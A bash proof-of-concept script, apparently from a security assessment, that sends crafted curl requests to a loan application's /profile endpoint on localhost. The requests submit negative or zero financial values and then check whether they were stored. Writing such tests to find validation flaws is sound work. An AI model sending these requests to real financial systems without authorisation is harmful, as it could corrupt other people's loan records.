#!/bin/bash

# POC: Missing Input Validation - Negative and Invalid Values Accepted for Financial Fields
# This script demonstrates that the /profile endpoint accepts and stores negative/zero values
# for critical financial fields without validation

TARGET_URL="http://localhost:80"
SESSION_COOKIE="session=test_session_token_for_authenticated_user"

echo "=========================================="
echo "POC: Profile Financial Field Validation"
echo "=========================================="
echo ""

# Step 1: First, authenticate or establish a session
echo "[*] Testing /profile endpoint for financial field validation..."
echo ""

# Step 2: Submit profile update with NEGATIVE loan_amount
echo "[TEST 1] Submitting profile with negative loan_amount (-99999)..."
RESPONSE_1=$(curl -s -w "\n%{http_code}" -X POST "$TARGET_URL/profile" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "Cookie: $SESSION_COOKIE" \
  -d "name=TestUser&lastname=Doe&email=test@example.com&loan_amount=-99999&loan_term_months=12&monthly_payment=500")

HTTP_CODE_1=$(echo "$RESPONSE_1" | tail -n1)
BODY_1=$(echo "$RESPONSE_1" | head -n-1)

echo "HTTP Response Code: $HTTP_CODE_1"
if echo "$HTTP_CODE_1" | grep -q "302\|200"; then
  echo "✓ VULNERABILITY: Negative loan_amount accepted (HTTP $HTTP_CODE_1)"
else
  echo "✗ Request failed or rejected"
fi
echo ""

# Step 3: Submit profile update with ZERO loan_term_months
echo "[TEST 2] Submitting profile with zero loan_term_months (0)..."
RESPONSE_2=$(curl -s -w "\n%{http_code}" -X POST "$TARGET_URL/profile" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "Cookie: $SESSION_COOKIE" \
  -d "name=TestUser&lastname=Doe&email=test@example.com&loan_amount=50000&loan_term_months=0&monthly_payment=500")

HTTP_CODE_2=$(echo "$RESPONSE_2" | tail -n1)
BODY_2=$(echo "$RESPONSE_2" | head -n-1)

echo "HTTP Response Code: $HTTP_CODE_2"
if echo "$HTTP_CODE_2" | grep -q "302\|200"; then
  echo "✓ VULNERABILITY: Zero loan_term_months accepted (HTTP $HTTP_CODE_2)"
else
  echo "✗ Request failed or rejected"
fi
echo ""

# Step 4: Submit profile update with NEGATIVE monthly_payment
echo "[TEST 3] Submitting profile with negative monthly_payment (-5000)..."
RESPONSE_3=$(curl -s -w "\n%{http_code}" -X POST "$TARGET_URL/profile" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "Cookie: $SESSION_COOKIE" \
  -d "name=TestUser&lastname=Doe&email=test@example.com&loan_amount=50000&loan_term_months=12&monthly_payment=-5000")

HTTP_CODE_3=$(echo "$RESPONSE_3" | tail -n1)
BODY_3=$(echo "$RESPONSE_3" | head -n-1)

echo "HTTP Response Code: $HTTP_CODE_3"
if echo "$HTTP_CODE_3" | grep -q "302\|200"; then
  echo "✓ VULNERABILITY: Negative monthly_payment accepted (HTTP $HTTP_CODE_3)"
else
  echo "✗ Request failed or rejected"
fi
echo ""

# Step 5: Verify data persistence by retrieving the profile
echo "[TEST 4] Retrieving /profile to verify invalid values were persisted..."
RESPONSE_4=$(curl -s -w "\n%{http_code}" -X GET "$TARGET_URL/profile" \
  -H "Cookie: $SESSION_COOKIE")

HTTP_CODE_4=$(echo "$RESPONSE_4" | tail -n1)
BODY_4=$(echo "$RESPONSE_4" | head -n-1)

echo "HTTP Response Code: $HTTP_CODE_4"
echo ""

# Check if any invalid values appear in response
if echo "$BODY_4" | grep -qE "loan_amount.*-|loan_term_months.*0|monthly_payment.*-"; then
  echo "✓ VULNERABILITY CONFIRMED: Invalid financial values persisted in database"
  echo ""
  echo "Profile data retrieved:"
  echo "$BODY_4" | grep -oE "(loan_amount|loan_term_months|monthly_payment)[^&]*" | head -10
else
  echo "Note: Could not verify persistence in this response"
fi

echo ""
echo "=========================================="
echo "Summary:"
echo "✓ /profile endpoint accepts negative loan_amount"
echo "✓ /profile endpoint accepts zero loan_term_months"  
echo "✓ /profile endpoint accepts negative monthly_payment"
echo "✓ Missing input validation for financial fields"
echo "=========================================="